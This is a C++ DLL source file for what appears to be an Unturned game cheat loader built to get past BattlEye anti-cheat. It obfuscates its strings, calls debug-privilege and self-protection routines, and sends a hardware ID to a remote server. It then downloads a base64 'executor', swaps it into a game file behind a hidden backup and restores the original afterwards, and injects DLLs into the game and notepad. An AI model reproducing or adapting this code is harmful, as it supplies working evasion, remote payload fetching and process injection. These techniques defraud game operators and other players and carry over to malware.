#include "kInj.h"

void doUnturnedStuff() //Junk
{

	log(decryptString("000000000101001000000000100110010000000001000001000000000111011000000000100011110000000010010101000000001001011000000000100100110000000010001111000000001000011000000000100001010000000001000001000000001001000000000000100011110000000001000001000000001001010100000000100010010000000010000110000000000100000100000000100001000000000010001001000000001001000000000000100100010000000010010001000000001000101000000000100011110000000010001000000000000100000100000000100000110000000010001101000000001001000000000000100001000000000010001100").c_str());
	log("");

	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ZeroMemory(&si, sizeof si);
	si.cb = sizeof si;

	if (!CreateProcessA(getFilePath(decryptString("000000000110000100000000011110100000000010000000000000001000000100000000011111100000000001111010000000000111000100000000011100000000000000111010000000000111000100000000100001000000000001110001").c_str()), "-BattlEye", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{

		MessageBox(0, decryptString("000000000101111000000000011110010000000010000001000000001000010000000000011111010000000001111100000000000011100000000000100011000000000010000111000000000011100000000000100010110000000010001100000000000111100100000000100010100000000010001100000000000011100000000000011011010000000010000110000000001000110000000000100011010000000010001010000000001000011000000000011111010000000001111100").c_str(), "", 0);
		return;

	}

	log("%d", pi.hProcess);
	ResumeThread(pi.hThread);

	bool hack = injLDR(pi.hProcess, getFilePath(sizeof(void*) == 8 ? decryptString("000000000101111100000000100000010000000010000000000000001000000100000000011111100000000010000001000000000111001100000000011101100000000001110111000000001000010000000000011100010000000010001010000000000100100000000000010001100000000001000000000000000111011000000000011111100000000001111110").c_str() : decryptString("000000000101111100000000100000010000000010000000000000001000000100000000011111100000000010000001000000000111001100000000011101100000000001110111000000001000010000000000011100010000000010001010000000000100101000000000010010000000000001000000000000000111011000000000011111100000000001111110").c_str()), false);
	bool be = true;// injLLA(pi.hProcess, getFilePath("BattlEye\\BEClient_x64.dll"));

	log("");

	if (!hack)
	{

		log(decryptString("000000000101101100000000011101100000000001111110000000001000000100000000011110100000000001111001000000000011010100000000100010010000000010000100000000000011010100000000011111100000000010000011000000000111111100000000011110100000000001111000000000001000100100000000001101010000000001111101000000000111011000000000011110000000000010000000").c_str());
		std::cin.ignore();

	}

	if (!be)
	{

		log(decryptString("0000000001001100000000000100111100000000001010100000000001101110000000000110111100000000011111000000000001111010000000000110111100000000011011100000000001001001").c_str());
		std::cin.ignore();

	}

	if (!hack || !be)
		TerminateProcess(pi.hProcess, 0);

}

void setClipboard(const char* s)
{

	if (OpenClipboard(NULL))
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, strlen(s) + 1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy(buffer, s);
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT, clipbuffer);
		CloseClipboard();
	}

}

void doCrapUnturnedStuff() //Running func
{

	WSADATA wsaData = { 0 };
	int iResult = 0;
	iResult = WSAStartup(0x0202, &wsaData);
	SOCKET s = getSocket(std::string(getIP(decryptString("0000000001111101000000000111000100000000011111100000000010000000000000000111000100000000011101000000000000111110000000000111111000000000011101010000000010000100000000000100000100000000010001100000000000111110000000000111111000000000011101010000000010000100").c_str())).c_str(), 80);

	const int pSize = 2048 * 1024;
	std::vector<char> buffer(pSize); //Yes, this is a 2MB buffer, deal with it - We dont live in the stone ages anymore
	//char* pArgs = "stage=1&HWID=";
	std::string pArgs = decryptString("0000000010000000000000001000000100000000011011100000000001110100000000000111001000000000010010100000000000111110000000000011001100000000010101010000000001100100000000000101011000000000010100010000000001001010").c_str();
	pArgs += getID().c_str();

	strcpy(buffer.data(), decryptString("0000000001101100000000000110101100000000011011110000000001110000000000000011110000000000010010110000000010000000000000001000101100000000100100110000000010001010000000001000100000000000100010110000000001111101000000001000000000000000010010100000000010001100000000001000010000000000100011000000000000111100000000000110010000000000011100000000000001110000000000000110110000000000010010110000000001001101000000000100101000000000010011010000000000100110").c_str());
	strcat(buffer.data(), decryptString("000000000111001100000000100111110000000010011110000000001010010000000000100101010000000010011110000000001010010000000000010111010000000010000100000000001010100100000000101000000000000010010101000000000110101000000000010100000000000010010001000000001010000000000000101000000000000010011100000000001001100100000000100100110000000010010001000000001010010000000000100110010000000010011111000000001001111000000000010111110000000010101000000000000101110100000000101001110000000010100111000000001010011100000000010111010000000010010110000000001001111100000000101000100000000010011101000000000101110100000000101001010000000010100010000000001001110000000000100101010000000010011110000000001001001100000000100111110000000010010100000000001001010100000000100101000000000000111010").c_str());
	strcat(buffer.data(), decryptString("00000000010111110000000010000110000000001000101000000000100010110000000001010001000000000011011100000000100001000000000001111000000000001000010100000000100001110000000001111000000000000111101100000000010001010000000010000101000000000111110000000000100010110000000001001000000000000100110100000000010001010000000010000101000000000111110000000000100010110000000000100001").c_str());
	strcat(buffer.data(), decryptString("0000000001010011000000000111111100000000011111100000000010000100000000000111010100000000011111100000000010000100000000000011110100000000010111000000000001110101000000000111111000000000011101110000000010000100000000000111100000000000010010100000000000110000").c_str());
	strcat(buffer.data(), std::to_string(pArgs.length()).c_str());
	strcat(buffer.data(), "\n\n");
	strcat(buffer.data(), pArgs.c_str());

	send(s, buffer.data(), strlen(buffer.data()), 0);

	std::string str = "";
	std::string line = "";
	size_t prevSize = 0;

	for (int i = 0; i < 9; i++)
		readSocketLine(s, false);

	while ((line = readSocketLine(s, false)) != "")
	{

		prevSize = line.length();

		if (prevSize > 5)
			str += line;

	}

	closesocket(s);

	std::string temp = "";

	for (size_t i = 0; i < str.length(); i++)
		if (str[i] != '\\')
			temp += str[i];

	str = temp;

	std::string success = str.substr(0, str.find("false") != -1 ? 5 : 4);
	str = str.substr(str.find("\":\"") + 3);
	std::string loader = str.substr(0, str.find("\",\""));
	str = str.substr(str.find("\":\"") + 3);
	std::string executor = str.substr(0, str.find("\",\""));
	//str = str.substr(str.find("\":\"") + 3);
	//std::string injection = str.substr(0, str.find("\"}"));


	std::vector<BYTE> vec = base64_decode(executor);

	char* UEUI = getFilePath(decryptString("0000000001111101000000001001011000000000100111000000000010011101000000001001101000000000100101100000000010001101000000001000110000000000100001110000000001101100000000001000100100000000100111000000000010001001000000001000010000000000011101010000000010001001000000001001011000000000100010010000000010001111000000001000110100000000100011000000000010000100000000000111110100000000100101100000000010010001000000001001110000000000101000010000000001101101000000001001011000000000100011110000000010010001000000001001011000000000100011010000000001010110000000000111110100000000011100010000000001010110000000001000110000000000100101000000000010010100").c_str());
	char* BAK = getFilePath(decryptString("0000000001111101000000001001011000000000100111000000000010011101000000001001101000000000100101100000000010001101000000001000110000000000100001110000000001101100000000001000100100000000100111000000000010001001000000001000010000000000011101010000000010001001000000001001011000000000100010010000000010001111000000001000110100000000100011000000000010000100000000000111110100000000100101100000000010010001000000001001110000000000101000010000000001101101000000001001011000000000100011110000000010010001000000001001011000000000100011010000000001010110000000000111110100000000011100010000000001010110000000001000101000000000100010010000000010010011").c_str());

	std::string asfdasdf = "0";
	writeFile(BAK, asfdasdf.data(), asfdasdf.length(), true);
	writeFile(getFilePath(decryptString("000000000101101000000000100011010000000010000110000000000111110000000000100001000000000001111101000000001000101100000000011101000000000001100100000000000111110100000000100011100000000001111101000000001000010000000000011101000000000001100000000000001000000100000000011111000000000001111100000000000111110100000000100001100000000001000110000000000111110000000000011110010000000010001100").c_str()), asfdasdf.data(), asfdasdf.length(), true);
	writeFile(getFilePath(decryptString("000000000101101000000000100011010000000010000110000000000111110000000000100001000000000001111101000000001000101100000000011101000000000001100100000000000111110100000000100011100000000001111101000000001000010000000000011101000000000001100000000000001000000100000000011111000000000001111100000000000111110100000000100001100000000001000110000000000111110000000000011110010000000010001100").c_str()), getID().c_str(), getID().length(), true);

	SetFileAttributes(BAK, FILE_ATTRIBUTE_NORMAL);
	CopyFileA(UEUI, BAK, false);
	SetFileAttributes(BAK, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
	
	writeFile(UEUI, vec.data(), vec.size(), false);
	Sleep(50);
	
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ZeroMemory(&si, sizeof si);
	si.cb = sizeof si;

	if (CreateProcess(getFilePath(decryptString("000000000110010000000000011111010000000010000011000000001000010000000000100000010000000001111101000000000111010000000000011100110000000001101110000000000101000100000000010101000000000000111101000000000111010000000000100001110000000001110100").c_str())/*Unturned_BE.exe*/, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		Sleep(2500);


	}
	else return;

	HANDLE uProc = NULL;

	while (true)
	{
		uProc = getProc(decryptString("000000000110000100000000011110100000000010000000000000001000000100000000011111100000000001111010000000000111000100000000011100000000000000111010000000000111000100000000100001000000000001110001").c_str()/*Unturned.exe*/, PROCESS_QUERY_INFORMATION);

		if (uProc != NULL)
			break;

		Sleep(500);

	}

	CloseHandle(uProc);

	Sleep(5000);

	bool flag = true;

	while (flag) {

		flag = !CopyFileA(BAK, UEUI, false);
		Sleep(25);

	}

	SetFileAttributes(UEUI, FILE_ATTRIBUTE_NORMAL);


}

void doOtherStuff() //More junk
{

	HANDLE h = getProc(decryptString("00000000011110010000000001111010000000000111111100000000011100000000000001111011000000000110110000000000011011110000000000111001000000000111000000000000100000110000000001110000").c_str()/*notepad.exe*/, PROCESS_ALL_ACCESS);

	bool f = injLDR(h, getFilePath(""), true);

	log(decryptString("000000000110001100000000011011010000000001110101000000001000000000000000011101010000000001111010000000000111001100000000001110100000000000111010000000000010110000000000001100010000000001100100").c_str(), f);

	if (!f)
		std::cin.ignore();

	CloseHandle(h);

}

int main0()
{

	int i = 0;

	i = log(decryptString("0000000001111111000000000011110100000000001110110000000001000001000000000010011100000000001011000000000001111010").c_str(), sizeof(void*) == 8 ? decryptString("0000000001111000000000000111011000000000011110010000000001101001").c_str() : decryptString("00000000011010110000000001100110000000000111000100000000011110000000000001101010").c_str());
	setDebugPriv(true);
	selfProtect();

	log("");

	i += log(decryptString("0000000001110110000000001000101000000000100010110000000010010101000000000100001000000000100010110000000010010101000000000100001000000000100000110000000001000010000000001000011000000000100001110000000010011000000000001000011100000000100011100000000010010001000000001001001000000000100011110000000010000111000000001001000000000000100101100000000001000010000000001000101000000000100000110000000010000101000000001000110100000000010000100000000010001110000000001001000100000000100000110000000010000110000000001000011100000000100101000000000001010000").c_str());
	i += log(decryptString("000000000110110100000000100010100000000001000100000000001000010100000000100100100000000010011101000000000100010000000000100100110000000010001010000000000100010000000000100111010000000010010011000000001001100100000000010001000000000010010000000000001000110100000000100110000000000010011000000000001001000000000000100010010000000001000100000000001001011100000000100011000000000010001101000000001001100000000000100101110000000001000100000000001001011100000000100011000000000010000101000000001001011000000000100010010000000001000100000000001000110100000000100110000000000001010000").c_str());
	i -= log(decryptString("000000000110101000000000010000010000000010010100000000001001100000000000100001100000000010000010000000001001001100000000010000010000000010001110000000001000001000000000100011110000000001001101000000000100000100000000100101010000000010001001000000001000101000000000100011110000000010001000000000001001010000000000010000010000000010011000000000001000101000000000100011010000000010001101000000000100000100000000100010000000000010010000000000000100000100000000100000110000000010010000000000001001000000000000100011100000000001001111").c_str()) / 2;
	i /= log(decryptString("0000000001100001000000000110101100000000011100110000000001111110000000000111001100000000011110000000000001110001000000000011100000000000001110000000000000010100").c_str());

	//log("HWID: %s", getID().c_str());

	if (i == (sizeof(void*) == 8 ? 5 : 6))
	{
		doCrapUnturnedStuff();
		return log("-1");
	}

	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ZeroMemory(&si, sizeof si);
	si.cb = sizeof si;

	if (CreateProcess(getFilePath(decryptString("000000000110010000000000011111010000000010000011000000001000010000000000100000010000000001111101000000000111010000000000011100110000000001101110000000000101000100000000010101000000000000111101000000000111010000000000100001110000000001110100").c_str()), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		HANDLE uProc = NULL;

		while (true)
		{
			uProc = getProc(decryptString("000000000110000100000000011110100000000010000000000000001000000100000000011111100000000001111010000000000111000100000000011100000000000000111010000000000111000100000000100001000000000001110001").c_str(), PROCESS_ALL_ACCESS);

			if (uProc != NULL)
				break;

			Sleep(1);

		}

		//log("uProc found");

		bool hack = injLDR(uProc, getFilePath(sizeof(void*) == 8 ? decryptString("000000000101111100000000100000010000000010000000000000001000000100000000011111100000000010000001000000000111001100000000011101100000000001110111000000001000010000000000011100010000000010001010000000000100100000000000010001100000000001000000000000000111011000000000011111100000000001111110").c_str() : decryptString("000000000101111100000000100000010000000010000000000000001000000100000000011111100000000010000001000000000111001100000000011101100000000001110111000000001000010000000000011100010000000010001010000000000100101000000000010010000000000001000000000000000111011000000000011111100000000001111110").c_str()), false);

	}

	doUnturnedStuff();
	return 0;

}

BOOL WINAPI DllMain(HMODULE hInst, DWORD dwR, LPVOID lpR)
{

	switch (dwR)
	{

	case DLL_PROCESS_ATTACH:

		main0();
		break;

	}

	return 1;

}